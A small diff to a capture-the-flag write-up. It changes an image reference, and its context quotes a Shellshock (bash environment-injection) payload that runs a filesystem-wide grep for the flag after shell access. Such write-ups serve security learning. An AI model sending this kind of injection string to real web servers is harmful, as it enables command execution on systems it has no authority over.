@@ -11,7 +11,7 @@
 * Now we have the shell, we still need to find the flag. I have looked at Apache directories, Apache config files, CGI directory, but there was nothing. So I had to do this!
     > `() { :; }; echo; echo; /bin/bash -c 'grep -ir LS{ /'`
 
-    ![Flag](1.png)
+    ![Flag](2.png)
 
 * And the flag was in the `home` directory!
 
